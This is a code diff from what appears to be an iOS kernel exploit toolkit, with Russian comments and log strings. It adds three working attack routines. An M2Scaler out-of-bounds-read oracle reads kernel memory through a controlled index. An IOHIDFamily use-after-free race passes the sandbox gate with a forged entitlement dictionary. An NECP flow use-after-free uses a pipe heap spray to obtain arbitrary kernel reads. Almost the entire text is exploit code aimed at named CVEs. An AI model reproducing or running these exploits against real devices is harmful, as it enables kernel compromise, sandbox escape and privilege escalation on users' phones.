+    if (!gM2OLive) return;
+    os_log_error(OS_LOG_DEFAULT, "[M2O] %{public}s", [line UTF8String]);
+    extern void KPLogDirect(const char *);
+    KPLogDirect([line UTF8String]);
+    NSString *p = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-m2oracle.txt"];
+    NSFileHandle *h = [NSFileHandle fileHandleForWritingAtPath:p];
+    NSData *d = [[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding];
+    if (!h) { [d writeToFile:p atomically:NO]; return; }
+    [h seekToEndOfFile];
+    [h writeData:d];
+    [h synchronizeFile];
+    [h closeFile];
+}
+
+static void kpM2ONote(NSMutableString *r, NSString *line)
+{
+    kpNote(r, line);
+    kpM2OLive(line);
+}
+
+// Собрать уникальные kernel-указатели из объекта.
+static uint32_t kpM2OCollectPtrs(uint64_t va, uint32_t size, uint64_t *out, uint32_t cap, NSMutableString *r)
+{
+    uint8_t buf[0x1000];
+    if (size > sizeof(buf)) size = sizeof(buf);
+    memset(buf, 0, sizeof(buf));
+    if (!kpLooksLikeKernelPointer(va) || !kpRead(va, buf, size, "m2o collect", r)) return 0;
+    uint32_t n = 0;
+    for (uint32_t o = 0; o + 8 <= size && n < cap; o += 8) {
+        uint64_t q = 0;
+        memcpy(&q, buf + o, 8);
+        uint64_t p = kp_untag_ptr(q);
+        if (!kpLooksLikeKernelPointer(p)) continue;
+        BOOL dup = NO;
+        for (uint32_t k = 0; k < n; k++) if (out[k] == p) { dup = YES; break; }
+        if (!dup) out[n++] = p;
+    }
+    return n;
+}
+
+// Маркер по точному оффсету (op-entry: credit @ +0xc3c по символизации паники).
+static BOOL kpM2OMarkerAt(uint64_t va, uint32_t off, uint32_t marker, NSMutableString *r)
+{
+    uint32_t v = 0;
+    return kpLooksLikeKernelPointer(va) &&
+           kpRead(va + off, &v, 4, "m2o marker@", r) && v == marker;
+}
+
+// Сбор указателей op-записей из entry-array scheduler'а: +0xc8 — указатель на
+// массив ИЛИ inline-массив (проверяем оба). Возвращает число собранных.
+static uint32_t kpM2OCollectEntries(uint64_t schedVA, uint64_t *eptrs, uint32_t cap, NSMutableString *r)
+{
+    uint32_t eN = 0;
+    uint64_t cnt = 0, arr = 0;
+    kpRead(schedVA + 0xb8, &cnt, 8, "m2o cnt", r);
+    kpRead(schedVA + 0xc8, &arr, 8, "m2o arr", r);
+    arr = kp_untag_ptr(arr);
+    if (kpLooksLikeKernelPointer(arr) && cnt && cnt <= cap) {
+        uint8_t abuf[128 * 8];
+        memset(abuf, 0, sizeof(abuf));
+        if (kpRead(arr, abuf, cnt * 8, "m2o array", r))
+            for (uint32_t i = 0; i < cnt; i++) {
+                uint64_t q = 0;
+                memcpy(&q, abuf + i * 8, 8);
+                uint64_t p = kp_untag_ptr(q);
+                if (kpLooksLikeKernelPointer(p)) eptrs[eN++] = p;
+            }
+    }
+    if (!eN) {
+        uint8_t ibuf[0x100];
+        memset(ibuf, 0, sizeof(ibuf));
+        if (kpRead(schedVA + 0xc8, ibuf, sizeof(ibuf), "m2o inline", r))
+            for (uint32_t o = 0; o + 8 <= sizeof(ibuf) && eN < 16; o += 8) {
+                uint64_t q = 0;
+                memcpy(&q, ibuf + o, 8);
+                uint64_t p = kp_untag_ptr(q);
+                if (kpLooksLikeKernelPointer(p)) eptrs[eN++] = p;
+            }
+    }
+    return eN;
+}
+
++ (NSString *)m2OracleReport
+{
+    NSMutableString *r = [NSMutableString string];
+    [[NSFileManager defaultManager] removeItemAtPath:[NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-m2oracle.txt"] error:nil];
+    gM2OLive = YES;
+    kpM2ONote(r, @"=== M2Scaler oracle: controlled OOB-read через credit-index (CVE-2026-43655) ===");
+    kpM2ONote(r, @"паника 045942: ldrb [sched+0x118 + entry->credit(+0xc3c)], RMW entry+0xbc4 += byte. Кредит = наш (sel 10, struct+0).");
+
+    if (!gPrimitives.kreadbuf) {
+        kpM2ONote(r, @"KRW не жив — сначала эксплойт. SKIP.");
+        gM2OLive = NO;
+        return r;
+    }
+
+    errno = 0;
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                   IOServiceMatching("AppleM2ScalerCSCDriver"));
+    if (!svc) {
+        kpM2ONote(r, @"сервис не найден — SKIP");
+        gM2OLive = NO;
+        return r;
+    }
+
+    // is_table цепочка (как в m2TeardownUafReport)
+    uint64_t isTable = 0;
+    uint64_t selfProc = [self findProcByCommName:getprogname() log:r];
+    if (!selfProc) selfProc = [self findProcByCommName:"KexProofV2" log:r];
+    uint64_t pr = 0, tk = 0, spc = 0, tb = 0;
+    if (selfProc &&
+        kpRead(selfProc + koffsetof(proc, proc_ro), &pr, 8, "m2o proc_ro", r) &&
+        kpRead(kp_untag_ptr(pr) + off_proc_ro_pr_task, &tk, 8, "m2o task", r) &&
+        kpRead(kp_untag_ptr(tk) + off_task_itk_space, &spc, 8, "m2o itk_space", r) &&
+        kpRead(kp_untag_ptr(spc) + off_ipc_space_is_table, &tb, 8, "m2o is_table", r)) {
+        isTable = (koffsetof(ipc_space, table_uses_smr) && smr_base && t1sz_boot)
+                  ? kp_untag_ptr(kpSMRDecode(tb)) : kp_untag_ptr(tb);
+    }
+    if (!isTable) {
+        kpM2ONote(r, @"is_table не разрешена — SKIP");
+        IOObjectRelease(svc);
+        gM2OLive = NO;
+        return r;
+    }
+
+    io_connect_t victim = IO_OBJECT_NULL;
+    if (IOServiceOpen(svc, mach_task_self(), 0, &victim) != KERN_SUCCESS || victim == IO_OBJECT_NULL) {
+        kpM2ONote(r, @"open victim отклонён — SKIP");
+        IOObjectRelease(svc);
+        gM2OLive = NO;
+        return r;
+    }
+    uint64_t victimVA = kpM2TClientVA(r, isTable, victim, @"victim");
+    uint64_t driverVA = kpM2TClientVA(r, isTable, svc, @"driver-svc");
+    kpM2ONote(r, [NSString stringWithFormat:@"  victim client @ %#llx, driver object @ %#llx",
+                  (unsigned long long)victimVA, (unsigned long long)driverVA]);
+
+    // ---- discovery: scheduler = pointee driver'а с layout из паники ----
+    // layout (раунд 11): +0xb8 count (мелкий), +0xc8 entry-array (kptr),
+    // +0x110 второй массив (kptr), +0x118/+0x11c inline byte-arrays.
+    uint64_t cand[64];
+    uint32_t candN = kpM2OCollectPtrs(driverVA, 0x800, cand, 64, r);
+    uint32_t clientN = kpM2OCollectPtrs(victimVA, 0x168, cand + candN, 64 - candN, r);
+    candN += clientN;
+    kpM2ONote(r, [NSString stringWithFormat:@"  discovery: %u указателей из driver+client", candN]);
+
+    uint64_t schedVA = 0;
+    for (uint32_t i = 0; i < candN && !schedVA; i++) {
+        uint64_t cnt = 0, arr = 0, arr2 = 0;
+        if (!kpRead(cand[i] + 0xb8, &cnt, 8, "m2o sch+b8", r)) continue;
+        if (!kpRead(cand[i] + 0xc8, &arr, 8, "m2o sch+c8", r)) continue;
+        if (!kpRead(cand[i] + 0x110, &arr2, 8, "m2o sch+110", r)) continue;
+        arr = kp_untag_ptr(arr);
+        arr2 = kp_untag_ptr(arr2);
+        if (cnt > 0x2000) continue;
+        if (!kpLooksLikeKernelPointer(arr) || !kpLooksLikeKernelPointer(arr2)) continue;
+        schedVA = cand[i];
+        kpM2ONote(r, [NSString stringWithFormat:@"  scheduler-кандидат @ %#llx: count=%llu array=%#llx array2=%#llx",
+                      (unsigned long long)schedVA, (unsigned long long)cnt,
+                      (unsigned long long)arr, (unsigned long long)arr2]);
+    }
+    if (!schedVA)
+        kpM2ONote(r, @"  scheduler по layout не найден — oracle-фаза пропущена, только discovery");
+
+    // ---- discovery op-записей. УРОК паники 0639: маркер в credit = БОМБА ----
+    // (credit — живой индекс ldrb [sched+0x118+credit]; 0xCAFE7777 = +3.2GB =
+    // мгновенный краш на pass'е). Поэтому: credit держим БЕЗОПАСНЫМ (0x10),
+    // записи опознаём по уникальному srcID отдельной discovery-поверхности.
+    NSDictionary *sp5 = @{(__bridge id)kIOSurfaceWidth:@(32), (__bridge id)kIOSurfaceHeight:@(32),
+                          (__bridge id)kIOSurfaceBytesPerElement:@(4), (__bridge id)kIOSurfacePixelFormat:@(0x42475241)};
+    IOSurfaceRef srcS = IOSurfaceCreate((__bridge CFDictionaryRef)sp5);
+    IOSurfaceRef dstS = IOSurfaceCreate((__bridge CFDictionaryRef)sp5);
+    if (!srcS || !dstS) {
+        kpM2ONote(r, @"  IOSurfaceCreate NULL — SKIP");
+        if (srcS) CFRelease(srcS);
+        if (dstS) CFRelease(dstS);
+        IOServiceClose(victim);
+        IOObjectRelease(svc);
+        gM2OLive = NO;
+        return r;
+    }
+    uint32_t srcID = IOSurfaceGetID(srcS);
+    uint32_t dstID = IOSurfaceGetID(dstS);
+
+    uint8_t s10[0x18];
+    memset(s10, 0, sizeof(s10));
+    *(uint32_t *)s10 = 0x10;   // безопасный credit: чтение sched+0x128, mapped
+    uint64_t sc[3] = {0, 0, 0};
+    kern_return_t ckr = IOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+
+    uint8_t tsdD[KP_M2_TSD_SIZE];
+    memset(tsdD, 0, sizeof(tsdD));
+    *(uint32_t *)(tsdD + 0x000) = srcID;
+    *(uint32_t *)(tsdD + 0x004) = dstID;
+    *(uint64_t *)(tsdD + 0x008) = 1;
+    for (int i = 0; i < 8; i++)
+        IOConnectCallMethod(victim, 1, NULL, 0, tsdD, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+    kpM2ONote(r, [NSString stringWithFormat:@"  victim credit=0x10 (kr=0x%x) + 8 async — ищу op-записи по credit +0xc3c", ckr]);
+
+    // Опознание по credit (v1.2): srcID в op-запись НЕ копируется (прогон
+    // 1.9.99 — 0 хитов по 0x2200), зато +0xc3c несёт наш credit. Массив был
+    // пуст (count=0) и вырос ровно до 8 от наших async — все записи наши.
+    uint64_t entryVA = 0;
+    if (schedVA) {
+        uint64_t eptrs[128];
+        uint32_t eN = kpM2OCollectEntries(schedVA, eptrs, 128, r);
+        kpM2ONote(r, [NSString stringWithFormat:@"  entry-array: указателей собрано=%u — проверяю +0xc3c==0x10", eN]);
+        for (uint32_t i = 0; i < eN && !entryVA; i++) {
+            if (kpM2OMarkerAt(eptrs[i], 0xc3c, 0x10, r)) {
+                entryVA = eptrs[i];
+                uint64_t bc4 = 0, f74 = 0;
+                kpRead(entryVA + 0xbc4, &bc4, 8, "m2o entry bc4", r);
+                kpRead(entryVA + 0x1f74, &f74, 8, "m2o entry 1f74", r);
+                kpM2ONote(r, [NSString stringWithFormat:@"  ★ op-запись @ %#llx: credit +0xc3c=0x10 ✓ counter(+0xbc4)=%#llx flags(+0x1f74)=%#llx",
+                              (unsigned long long)entryVA, (unsigned long long)bc4, (unsigned long long)f74]);
+            }
+        }
+        if (!entryVA)
+            kpM2ONote(r, @"  записей с credit=0x10 не найдено — дренулись до скана / scheduler не тот");
+    }
+
+    // ---- oracle: credit = смещение → байт [sched+0x118+credit] → entry+0xbc4 ----
+    if (schedVA && entryVA) {
+        kpM2ONote(r, @"--- ORACLE: свип смещений (каждая итерация находит СВЕЖУЮ запись с credit=T) ---");
+        io_connect_t churn = IO_OBJECT_NULL;
+        IOServiceOpen(svc, mach_task_self(), 0, &churn);
+        if (churn != IO_OBJECT_NULL) {
+            memset(s10, 0, sizeof(s10));
+            *(uint32_t *)s10 = 0x30;   // churn-credit отличен от всех T
+            IOConnectCallMethod(churn, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+        }
+        uint8_t tsd[KP_M2_TSD_SIZE];
+        memset(tsd, 0, sizeof(tsd));
+        *(uint32_t *)(tsd + 0x000) = srcID;
+        *(uint32_t *)(tsd + 0x004) = dstID;
+        *(uint64_t *)(tsd + 0x008) = 1;
+        const uint32_t offsets[] = { 0x8, 0x18, 0x28, 0x40, 0x100, 0x400, 0x1000, 0x4000 };
+        for (int t = 0; t < 8; t++) {
+            uint32_t T = offsets[t];
+            memset(s10, 0, sizeof(s10));
+            *(uint32_t *)s10 = T;
+            IOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+            IOConnectCallMethod(victim, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+            IOConnectCallMethod(victim, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+            // свежая запись с credit==T (прошлая дренулась за миллисекунды)
+            uint64_t eptrs[128];
+            uint32_t eN = kpM2OCollectEntries(schedVA, eptrs, 128, r);
+            uint64_t eVA = 0;
+            for (uint32_t i = 0; i < eN; i++) {
+                if (kpM2OMarkerAt(eptrs[i], 0xc3c, T, r)) { eVA = eptrs[i]; break; }
+            }
+            if (!eVA) {
+                kpM2ONote(r, [NSString stringWithFormat:@"  T=%#06x: запись не найдена в массиве (дренаж) — пропуск", T]);
+                continue;
+            }
+            uint64_t baseCnt = 0;
+            kpRead(eVA + 0xbc4, &baseCnt, 8, "m2o bc4 base", r);
+            for (int i = 0; i < 40 && churn != IO_OBJECT_NULL; i++)
+                IOConnectCallMethod(churn, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+            usleep(2000);
+            uint64_t nowCnt = 0;
+            kpRead(eVA + 0xbc4, &nowCnt, 8, "m2o bc4 now", r);   // freed-слот читается безопасно (зона)
+            uint8_t direct = 0;
+            BOOL dok = kpRead(schedVA + 0x118 + T, &direct, 1, "m2o direct", r);
+            long long delta = (long long)(nowCnt - baseCnt);
+            kpM2ONote(r, [NSString stringWithFormat:@"  T=%#06x: entry @ %#llx +0xbc4 delta=%lld, прямой байт=%#04x %@ %@",
+                          T, (unsigned long long)eVA, delta, direct, dok ? @"" : @"(kread fail)",
+                          (dok && delta != 0 && direct != 0 && delta % direct == 0) ? @"★ ORACLE MATCH" :
+                          (dok && direct == 0 && delta == 0) ? @"★ ноль-контроль OK" : @"—"]);
+        }
+        if (churn != IO_OBJECT_NULL) IOServiceClose(churn);
+        kpM2ONote(r, @"ORACLE-вердикт: MATCH по серии смещений = managed OOB-read без ClearSword; нули/промахи = pass не трогает запись в этом окне — повторить");
+    }
+
+    kpM2ONote(r, @"=== oracle завершён (паника здесь НЕ нужна: управляемое чтение вместо краша) ===");
+    CFRelease(srcS);
+    CFRelease(dstS);
+    IOServiceClose(victim);
+    IOObjectRelease(svc);
+    gM2OLive = NO;
+    return r;
+}
+
+#pragma mark - HID FastPath UAF (CVE-2026-28992)
+
+// close (sel1) drops provider state unlocked; copyEvent (sel2) calls into it
+// under a per-conn lock. Race across 15 connections to the same provider →
+// MTE tag fault on A17+. Unpatched on 18.6 (fixed 18.7.9). Gate: sel0 checks
+// the caller-supplied OSDictionary for entitlement keys instead of
+// initWithTask flags — sandbox passes by sending them itself.
+#define KP_HID_NUM_CONNS 15
+#define KP_HID_COPY_THREADS 8
+
+static _Atomic bool gHidStop = false;
+static io_connect_t gHidConns[KP_HID_NUM_CONNS];
+static NSData *gHidGateXML = nil;
+
+static kern_return_t kpHidGate(io_connect_t conn)
+{
+    uint64_t scalar = 0;
+    return IOConnectCallMethod(conn, 0, &scalar, 1,
+                               gHidGateXML.bytes, gHidGateXML.length,
+                               NULL, NULL, NULL, NULL);
+}
+
+static void *kpHidChurnMain(void *arg)
+{
+    uint64_t scalar = 0;
+    while (!atomic_load(&gHidStop)) {
+        IOConnectCallMethod(gHidConns[0], 1, &scalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
+        kpHidGate(gHidConns[0]);
+    }
+    return NULL;
+}
+
+static void *kpHidCopyMain(void *arg)
+{
+    int idx = (int)(intptr_t)arg;
+    uint64_t args[2] = { 0, 1 };
+    while (!atomic_load(&gHidStop)) {
+        IOConnectCallMethod(gHidConns[idx], 2, args, 2, NULL, 0, NULL, NULL, NULL, NULL);
+    }
+    return NULL;
+}
+
++ (NSString *)hidUafReport
+{
+    NSMutableString *r = [NSMutableString string];
+    kpNote(r, @"=== CVE-2026-28992: IOHIDFamily FastPathUserClient UAF (race close vs copyEvent) ===");
+    kpNote(r, @"!!! МОЖЕТ ПАНИКОВАТЬ (MTE tag check fault на A17+) — паника = баг подтверждён !!!");
+    kpNote(r, @"Сценарий: 15 коннекшенов к IOHIDEventService (type 2), gate sel0 с entitlement-bypass XML, churn close/reopen на conn[0] + 8 тредов copyEvent на conn[1..14], до 30с.");
+
+    gHidGateXML = [NSPropertyListSerialization dataWithPropertyList:@{
+                       @"FastPathHasEntitlement": @YES,
+                       @"FastPathMotionEventEntitlement": @YES}
+                                                              format:NSPropertyListXMLFormat_v1_0
+                                                               options:0 error:nil];
+    if (!gHidGateXML) { [r appendString:@"FAIL: gate XML не сериализовался\n"]; return r; }
+
+    errno = 0;
+    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                       IOServiceMatching("IOHIDEventService"));
+    if (!service) {
+        kpNote(r, [NSString stringWithFormat:@"  IOHIDEventService: не найден (errno=%d) — sandbox прячет", errno]);
+        [r appendString:@"\n=== HID UAF SKIP: сервис недоступен ===\n"];
+        return r;
+    }
+    kpNote(r, [NSString stringWithFormat:@"  IOHIDEventService: 0x%x", service]);
+
+    int opened = 0, gated = 0;
+    for (int i = 0; i < KP_HID_NUM_CONNS; i++) {
+        gHidConns[i] = IO_OBJECT_NULL;
+        kern_return_t kr = IOServiceOpen(service, mach_task_self(), 2, &gHidConns[i]);
+        if (kr != KERN_SUCCESS || gHidConns[i] == IO_OBJECT_NULL) {
+            kpNote(r, [NSString stringWithFormat:@"  IOServiceOpen[%d] (type 2): FAIL kr=0x%x (%s)", i, kr, mach_error_string(kr)]);
+            continue;
+        }
+        opened++;
+        kern_return_t gkr = kpHidGate(gHidConns[i]);
+        if (gkr == KERN_SUCCESS) gated++;
+        else kpNote(r, [NSString stringWithFormat:@"  gate[%d]: kr=0x%x (%s) — entitlement bypass частично/не сработал", i, gkr, mach_error_string(gkr)]);
+    }
+    kpNote(r, [NSString stringWithFormat:@"  открыто %d/%d коннекшенов, gate прошли %d", opened, KP_HID_NUM_CONNS, gated]);
+    if (!opened) {
+        IOObjectRelease(service);
+        [r appendString:@"\n=== HID UAF SKIP: ни одного коннекшена — sandbox deny iokit-user-client-class ===\n"];
+        return r;
+    }
+
+    // Gate slammed with exclusive-access on the system service (backboardd
+    // holds FastPath permanently). Fallback: our own virtual HID device.
+    if (!gated) {
+        kpNote(r, @"  gate закрыт на системном сервисе (exclusive, backboardd держит FastPath) — пробую виртуальный HID-девайс…");
+        extern CFTypeRef IOHIDUserDeviceCreate(CFAllocatorRef allocator, CFDictionaryRef properties);
+        NSDictionary *devProps = @{
+            @"VendorID": @0x1337,
+            @"ProductID": @0x4242,
+            @"Product": @"KPTestHID",
+            @"DeviceUsagePairs": @[ @{ @"DeviceUsagePage": @1, @"DeviceUsage": @6 } ],
+            @"Elements": @[ @{ @"ElementCookie": @1, @"UsagePage": @1, @"Usage": @6,
+                               @"Type": @2, @"ReportCount": @8, @"ReportSize": @1 } ],
+        };
+        CFTypeRef vdev = IOHIDUserDeviceCreate(kCFAllocatorDefault, (__bridge CFDictionaryRef)devProps);
+        if (!vdev) {
+            kpNote(r, @"  IOHIDUserDeviceCreate вернул NULL — на iOS нужен entitlement com.apple.developer.hid.virtual.device, у нас его нет");
+        } else {
+            kpNote(r, @"  виртуальный девайс создан — ищу его сервис…");
+            usleep(300000);
+            io_service_t vservice = 0;
+            io_iterator_t it = 0;
+            if (IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHIDUserDevice"), &it) == KERN_SUCCESS && it) {
+                vservice = IOIteratorNext(it);
+                IOObjectRelease(it);
+            }
+            if (vservice) {
+                for (int i = 0; i < opened; i++) if (gHidConns[i] != IO_OBJECT_NULL) { IOServiceClose(gHidConns[i]); gHidConns[i] = IO_OBJECT_NULL; }
+                opened = 0; gated = 0;
+                for (int i = 0; i < KP_HID_NUM_CONNS; i++) {
+                    kern_return_t kr = IOServiceOpen(vservice, mach_task_self(), 2, &gHidConns[i]);
+                    if (kr != KERN_SUCCESS || gHidConns[i] == IO_OBJECT_NULL) continue;
+                    opened++;
+                    if (kpHidGate(gHidConns[i]) == KERN_SUCCESS) gated++;
+                }
+                kpNote(r, [NSString stringWithFormat:@"  на виртуальном девайсе: открыто %d, gate %d", opened, gated]);
+                IOObjectRelease(vservice);
+            } else {
+                kpNote(r, @"  сервис виртуального девайса не найден в реестре");
+            }
+            CFRelease(vdev);
+        }
+        if (!gated) {
+            IOObjectRelease(service);
+            for (int i = 0; i < opened; i++) if (gHidConns[i] != IO_OBJECT_NULL) IOServiceClose(gHidConns[i]);
+            [r appendString:@"\n=== HID UAF SKIP: gate не пройден ни на системном сервисе, ни на виртуальном — entitlement bypass на 18.6 не даёт FastPath-сессию ===\n"];
+            return r;
+        }
+    }
+
+    atomic_store(&gHidStop, false);
+    pthread_t churn;
+    pthread_create(&churn, NULL, kpHidChurnMain, NULL);
+    pthread_t copiers[KP_HID_COPY_THREADS];
+    for (int i = 0; i < KP_HID_COPY_THREADS; i++) {
+        int idx = (i % (KP_HID_NUM_CONNS - 1)) + 1;
+        pthread_create(&copiers[i], NULL, kpHidCopyMain, (void *)(intptr_t)idx);
+    }
+    kpNote(r, @"  гонка запущена: churn(conn[0]) + 8×copyEvent — паника обычно < 5с, ждём до 30с…");
+
+    for (int s = 0; s < 6; s++) {
+        sleep(5);
+        kpNote(r, [NSString stringWithFormat:@"  …%dс — живы (паника возможна в любой момент)", (s + 1) * 5]);
+    }
+    atomic_store(&gHidStop, true);
+    pthread_join(churn, NULL);
+    for (int i = 0; i < KP_HID_COPY_THREADS; i++) pthread_join(copiers[i], NULL);
+    for (int i = 0; i < KP_HID_NUM_CONNS; i++)
+        if (gHidConns[i] != IO_OBJECT_NULL) IOServiceClose(gHidConns[i]);
+    IOObjectRelease(service);
+    kpNote(r, @"--- 30с без паники — баг не сложился в этом прогоне (тайминг) или поверхность отличается ---");
+    [r appendString:@"\n=== HID UAF: дожили до конца без паники — повторить; если упорно не падает — смотрим syslog на didTerminate/teardown ===\n"];
+    return r;
+}
+
+#pragma mark - NECP UAF probe (natsuk1 vector, verified against 18.6)
+
+#define KP_NECP_OPEN        501
+#define KP_NECP_ACTION      502
+#define KP_NECP_ADD_CLIENT  0x01
+#define KP_NECP_COPY_RESULT 0x04
+#define KP_NECP_ADD_FLOW    0x11
+#define KP_NECP_REMOVE_FLOW 0x12
+#define KP_NECP_GATE_BYTE   9
+#define KP_NCF_BUF_SZ       0x800
+#define KP_NCF_ASSIGNED_OFF     0x5A0
+#define KP_NCF_ASSIGNED_LEN_OFF 0x5A8
+#define KP_NECP_EXHAUST_N   256
+#define KP_NECP_SPRAY_N     512
+#define KP_NECP_COPY_SZ     8192
+
+typedef struct __attribute__((packed)) {
+    uint8_t  out_uuid[16];
+    uint8_t  in_uuid[16];
+    uint16_t flags;
+    uint16_t nexus_count;
+    uint32_t pad;
+} kp_necp_flow_req_t;
+
+static long kpNecpAction(int fd, uint32_t action, void *u, size_t ul, void *d, size_t dl)
+{
+    return syscall(KP_NECP_ACTION, fd, action, u, (uint32_t)ul, d, (uint32_t)dl);
+}
+
+static int kpNecpAddFlowRaw(int fd, const uint8_t *clientUUID, uint8_t *flowUUIDOut)
+{
+    kp_necp_flow_req_t req;
+    memset(&req, 0, sizeof(req));
+    memcpy(req.in_uuid, clientUUID, 16);
+    req.flags = 0x0040;
+    req.nexus_count = 0;
+    long r = kpNecpAction(fd, KP_NECP_ADD_FLOW, (void *)clientUUID, 16, &req, sizeof(req));
+    if (r == 0) {
+        memcpy(flowUUIDOut, req.out_uuid, 16);
+        int az = 1;
+        for (int j = 0; j < 16; j++) if (flowUUIDOut[j]) { az = 0; break; }
+        if (az) memcpy(flowUUIDOut, req.in_uuid, 16);
+    }
+    return (int)r;
+}
+
+static int kpNecpRemoveFlow(int fd, const uint8_t *flowUUID)
+{
+    return (int)kpNecpAction(fd, KP_NECP_REMOVE_FLOW, (void *)flowUUID, 16, NULL, 0);
+}
+
+static int gNecpPipe[2] = { -1, -1 };
+static volatile int gNecpSprayGo = 0, gNecpSprayDone = 0, gNecpSprayReady = 0, gNecpSprayWrote = 0;
+static const uint8_t *gNecpSpraySrc = NULL;
+static size_t gNecpSprayLen = 0;
+
+static void *kpNecpSprayMain(void *arg)
+{
+    (void)arg;
+    __sync_fetch_and_add(&gNecpSprayReady, 1);
+    while (!gNecpSprayGo) __asm__ volatile("yield");
+    int wrote = 0;
+    for (int i = 0; i < KP_NECP_SPRAY_N; i++) {
+        ssize_t w = write(gNecpPipe[1], gNecpSpraySrc, gNecpSprayLen);
+        if (w > 0) wrote++;
+        else if (w < 0 && errno != EAGAIN) break;
+    }
+    gNecpSprayWrote = wrote;
+    __sync_fetch_and_add(&gNecpSprayDone, 1);
+    return NULL;
+}
+
+// one UAF attempt with a fake flow blob; returns copy_result length or <0
+static long kpNecpUafExecute(int fd, const uint8_t *clientUUID,
+                             const uint8_t *fake, size_t fakeSz,
+                             uint8_t *out, size_t outSz, NSMutableString *r)
+{
+    uint8_t exhaustUUIDs[KP_NECP_EXHAUST_N][16];
+    int nExhaust = 0;
+    for (int i = 0; i < KP_NECP_EXHAUST_N; i++) {
+        if (kpNecpAddFlowRaw(fd, clientUUID, exhaustUUIDs[i]) == 0) nExhaust++;
+    }
+    kpNote(r, [NSString stringWithFormat:@"  exhaust: %d/%d flow добавлено", nExhaust, KP_NECP_EXHAUST_N]);
+    uint8_t flowUUID[16];
+    int haveFlow = 0;
+    for (int retry = 0; retry < 64 && !haveFlow; retry++) {
+        uint8_t u[16];
+        if (kpNecpAddFlowRaw(fd, clientUUID, u) != 0) break;
+        if (u[KP_NECP_GATE_BYTE] & 0x01) { memcpy(flowUUID, u, 16); haveFlow = 1; }
+        else kpNecpRemoveFlow(fd, u);
+    }
+    if (!haveFlow) {
+        for (int i = 0; i < nExhaust; i++) kpNecpRemoveFlow(fd, exhaustUUIDs[i]);
+        kpNote(r, [NSString stringWithFormat:@"  gated flow не найден за 64 попытки (exhaust=%d)", nExhaust]);
+        return -2;
+    }
+    kpNote(r, @"  gated flow найден — remove + spray");
+    uint8_t *heap = mmap(NULL, KP_NCF_BUF_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (heap == MAP_FAILED) return -3;
+    memset(heap, 0, KP_NCF_BUF_SZ);
+    memcpy(heap, fake, fakeSz > KP_NCF_BUF_SZ ? KP_NCF_BUF_SZ : fakeSz);
+    if (pipe(gNecpPipe) != 0) { munmap(heap, KP_NCF_BUF_SZ); return -4; }
+    // Non-blocking: the buffer fills after ~8-64 writes and a blocking write
+    // would sleep forever with no reader — this was the hang.
+    fcntl(gNecpPipe[0], F_SETFL, O_NONBLOCK);
+    fcntl(gNecpPipe[1], F_SETFL, O_NONBLOCK);
+    gNecpSpraySrc = heap;
+    gNecpSprayLen = KP_NCF_BUF_SZ - 0x10;
+    gNecpSprayReady = gNecpSprayGo = gNecpSprayDone = gNecpSprayWrote = 0;
+    pthread_t tid;
+    pthread_create(&tid, NULL, kpNecpSprayMain, NULL);
+    while (gNecpSprayReady == 0) __asm__ volatile("yield");
+    kpNecpRemoveFlow(fd, flowUUID);
+    gNecpSprayGo = 1;
+    for (long spin = 0; spin < 50000000L && !gNecpSprayDone; spin++) __asm__ volatile("yield");
+    pthread_join(tid, NULL);
+    kpNote(r, [NSString stringWithFormat:@"  spray: %d записей в pipe (non-block), copy_result…", gNecpSprayWrote]);
+    long r3 = kpNecpAction(fd, KP_NECP_COPY_RESULT, (void *)clientUUID, 16, out, outSz);
+    if (gNecpPipe[0] >= 0) { close(gNecpPipe[0]); gNecpPipe[0] = -1; }
+    if (gNecpPipe[1] >= 0) { close(gNecpPipe[1]); gNecpPipe[1] = -1; }
+    for (int i = 0; i < nExhaust; i++) kpNecpRemoveFlow(fd, exhaustUUIDs[i]);
+    munmap(heap, KP_NCF_BUF_SZ);
+    return r3;
+}
+
++ (NSString *)necpUafProbeReport
+{
+    NSMutableString *r = [NSMutableString string];
+    kpNote(r, @"=== NECP flow UAF probe (natsuk1 vector → 18.6) ===");
+    kpNote(r, @"add_flow → remove_flow(gated) → pipe spray → copy_result. >0 = dangling flow читается → arbitrary kread (fake flow assigned_addr). Независим от ClearSword второй баг.");
+    kpNote(r, @"kread-тест: fake flow с assigned=kernel base — ждём magic 0xfeedfacf в copy_result.");
+
+    errno = 0;
+    int fd = (int)syscall(KP_NECP_OPEN, 0);
+    if (fd < 0) {
+        kpNote(r, [NSString stringWithFormat:@"  necp_open: FAIL errno=%d (%s) — NECP недоступен из sandbox?", errno, strerror(errno)]);
+        [r appendString:@"\n=== NECP SKIP: necp_open не прошёл ===\n"];
+        return r;
+    }
+    uint8_t uuid[16];
+    {
+        uint8_t params[1] = {0};
+        long rc = kpNecpAction(fd, KP_NECP_ADD_CLIENT, uuid, 16, params, 1);
+        if (rc != 0) {
+            kpNote(r, [NSString stringWithFormat:@"  add_client: FAIL rc=%ld errno=%d", rc, errno]);
+            close(fd);
+            [r appendString:@"\n=== NECP SKIP: add_client не прошёл ===\n"];
+            return r;
+        }
+    }
+    kpNote(r, [NSString stringWithFormat:@"  necp_open fd=%d · client=%02x%02x%02x%02x", fd, uuid[0], uuid[1], uuid[2], uuid[3]]);
+
+    // Stage 0 (baseline): copy_result WITHOUT remove_flow. If it returns the
+    // same 241 bytes — that's legal cached-result behavior, not a UAF.
+    {
+        uint8_t flowUUID[16];
+        int got = (kpNecpAddFlowRaw(fd, uuid, flowUUID) == 0);
+        uint8_t *res = calloc(1, KP_NECP_COPY_SZ);
